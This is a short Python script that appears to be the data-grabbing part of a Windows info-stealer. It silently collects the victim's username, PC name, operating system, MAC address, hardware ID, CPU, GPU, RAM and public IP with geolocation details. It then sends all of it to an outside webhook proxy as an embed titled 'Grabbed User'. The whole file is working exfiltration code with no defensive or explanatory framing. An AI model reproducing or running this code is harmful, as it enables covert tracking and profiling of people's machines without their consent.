import requests
import os
import re
import uuid
import getpass
import wmi
import platform
import subprocess

pcname = os.path.expanduser("~")[9:]
username = getpass.getuser()
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer_os = platform.platform()
cpu = wmi.WMI().Win32_Processor()[0]
gpu = wmi.WMI().Win32_VideoController()[0]
ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()


ip = requests.get('https://api.ipify.org/').text
r = requests.get(f"http://ip-api.com/json/{ip}?fields=message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query").json()

def format_asp(json_data):
    formatted_output = ""
    for key, value in json_data.items():
        formatted_output += f"{key}: {value}\n"
    return formatted_output

asp_formatted = format_asp(r)

data = {
    "username" : f"Grabbed User: {pcname}",
    "avatar_url": "https://wallpapersden.com/joker-hahaha-wallpaper/5120x2880/",
    "embeds": [{
        "title": "PC Information",
        "description": f"💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{pcname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{gpu.Name}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`\n👀 **IP Data:** ```{asp_formatted}```",
        "color": 16711680  # Red color
    }]
}

webhook = "https://dude.ong/api/proxy/"
requests.post(webhook, json=data)